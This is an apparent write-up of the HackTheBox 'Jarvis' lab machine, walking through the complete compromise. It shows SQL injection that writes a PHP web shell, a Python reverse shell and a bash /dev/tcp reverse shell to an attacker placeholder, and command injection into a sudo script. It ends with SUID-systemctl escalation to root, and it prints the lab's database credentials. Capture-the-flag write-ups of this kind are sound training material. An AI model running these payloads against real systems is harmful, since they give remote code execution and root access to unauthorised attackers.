---
description: Jarvis box from HackTheBox write up.
---

# Jarvis

## Nmap scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 1000 -p- <MACHINE_IP>     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 10:55 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.047s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
64999/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 25.05 seconds
```

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Jarvis]
└─$ sudo nmap -sC -sV -p22,80,64999 <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 10:57 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.045s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds
```

In this case it is a Linux box with only three open ports, two websites and SSH.

## Port 64999

This page just informs that we are banned for 90 seconds, I don't know why because we are good people. Looks like the page always return that, no matter the URL.

I tried to change some headers to request the page but no luck.

## Port 80

Here we see a hotel page, at first glance I can see a domain name: `supersecurehotel.htb` and also an email: `supersecurehotel@logger.htb`. Adding the domain name to my hosts file and visiting it didn't reveal any virtual hosts so let's continue.

The `/room.php` page looks promising, after trying some things looks like the `cod` URL parameter is SQL injectable beacuse after introducing `1 and 4=4` the page showed the first room. 

### SQL Injection

After some trial and error the payload `100 UNION SELECT 1,2,3,4,5,6,7` worked, and showed some of the dummy values used (Don't worry about the encoding because the browser do that for us, at least Firefox).

Time to check what platform we have in front: `100 UNION SELECT 1,2,3,4,@@version,6,7` prints `10.1.37-MariaDB-0+deb9u1` so we are against MySQL. I had a good time enumerating the information of the database but was useless so I will just skip to the fun part.

If the website is using a privileged user we can try to inject files. Using this payload: `100 UNION SELECT 1,2,3,4,@@version,6,7 INTO dumpfile '/var/www/html/images/test.txt'` and checking `/images` confirms that we can write files beacuse our test file is there. Changing the payload a bit: `100 UNION SELECT '<?php',';',';',';','system($_GET[\'cmd\']);',';','?>' INTO outfile '/var/www/html/images/pwn.php'` and going to `/images/pwn.php?cmd=id` confirm that we have now RCE since the page showed: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

## Getting a reverse shell

I decided to go for a Python reverse shell, this is the URL encoded payload:
```
export RHOST%3D"<ATACKER_IP>"%3Bexport RPORT%3D<ATACKER_PORT>%3Bpython -c 'import sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket()%3Bs.connect((os.getenv("RHOST")%2Cint(os.getenv("RPORT"))))%3B[os.dup2(s.fileno()%2Cfd) for fd in (0%2C1%2C2)]%3Bpty.spawn("%2Fbin%2Fsh")'%0A
```

Before sending the payload to the web shell, make sure Netcat is listenning. That way the reverse shell will come back.

## As www-data in the machine

Once we are in, we can get the database credentials: `DBadmin:imissyou`. The only users that can login to the server are `pepper` and `root`:
```bash
www-data@jarvis:/$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
```

The database credential with the `pepper` user won't work but we have this:
```bash
www-data@jarvis:/var/www/html/images$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

We can execute the `/var/www/Admin-Utilities/simpler.py` program as `pepper`, maybe we can exploit it. The program has an option to execute a `ping` command and ask for an IP address. After some trial and error looks like the program is not filtering the characters `$`, `(` and `)` so we could inject a command to get a shell as the `pepper` user:
```bash
www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(bash)  
pepper@jarvis:/var/www/Admin-Utilities$
```

Even though it worked... the commands executed in the new shell are not showing any output, so I just executed another reverse shell:
```bash
www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(bash)  
pepper@jarvis:/var/www/Admin-Utilities$ bash -i >& /dev/tcp/<ATACKER_IP>/<ATACKER_PORT> 0>&1
```

And now everything is working:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [<ATACKER_IP>] from (UNKNOWN) [<MACHINE_IP>] 40576
pepper@jarvis:/var/www/Admin-Utilities$ ls
ls
simpler.py
test.txt
text.txt
```

We can now grab the user flag under `/home/pepper/user.txt`.

## As Pepper in the machine

The first thing I did was to generate SSH keys for Pepper to get a more stable shell. Now, after checking for SUID files:
```bash
pepper@jarvis:~$ find / -perm /4000 2> /dev/null 
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
We can see that `systemctl` is a SUID binary and we can use that to escalate.

### Getting root

Since the `systemctl` binary has the SUID bit it won't drop privileges. The idea is to create a malicious service that will execute a command of our choice. In this case, I will make the service put the SUID bit to the `bash` binary to get easy privilege escalation from our current SSH session:
```bash
pepper@jarvis:~$ cat pwn.service 
[Service]
Type=oneshot
ExecStart=/bin/chmod u+s /bin/bash
[Install]
WantedBy=multi-user.target
```

Once the service is created we have to execute it and we would have a SUID `bash` binary:
```bash
pepper@jarvis:~$ systemctl link /home/pepper/pwn.service 
Created symlink /etc/systemd/system/pwn.service → /home/pepper/pwn.service.
pepper@jarvis:~$ systemctl start pwn.service
pepper@jarvis:~$ ls -l /bin/bash 
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
```

So now we can just:
```bash
pepper@jarvis:~$ bash -p
bash-4.4#
```
And get the root flag under `/root/root.txt`.
